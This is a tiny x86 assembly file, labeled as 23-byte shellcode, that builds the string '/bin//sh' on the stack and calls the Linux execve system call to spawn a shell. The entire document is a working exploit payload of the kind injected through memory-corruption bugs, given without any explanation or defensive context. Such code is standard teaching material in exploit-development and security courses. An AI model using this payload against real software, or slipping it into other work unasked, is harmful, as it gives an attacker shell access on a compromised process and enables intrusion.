; x86 (LE) Shellcode / 23 bytes

BITS 32
    xor eax, eax
    push eax
    push '//sh'
    push '/bin'
    mov ebx, esp
    xor ecx, ecx 
    xor edx, edx
    mov al, 11
    int 0x80